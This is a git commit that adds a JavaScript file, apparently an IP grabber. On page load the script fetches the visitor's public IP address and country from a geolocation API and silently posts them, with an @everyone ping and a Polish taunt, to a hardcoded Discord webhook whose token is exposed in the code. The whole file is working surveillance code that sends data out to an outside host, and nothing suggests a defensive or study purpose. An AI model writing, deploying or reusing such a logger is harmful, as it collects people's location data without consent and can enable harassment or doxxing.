4e137f7458ff183c785b3b983afa36d4c1937fa8
igorekToKox <112409638+igorekToKox@users.noreply.github.com>
2022-08-29 18:11:40 +0200

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,36 @@
+var webHookUrl = "https://discord.com/api/webhooks/1013829481615593554/pIoCV9AGvQW1Lt2ZIVzjc2WVLqvntEmTGmLP7WNRkf-ynQYHvc967w5z7_Gz-0vri8tk";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "IP Log",
+        avatar_url: "https://cdn.discordapp.com/avatars/469533331382468617/321809773d46fb046967f885135fd588.png?size=4096",
+        content:    "**Masz bombe w neta ** @everyone \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
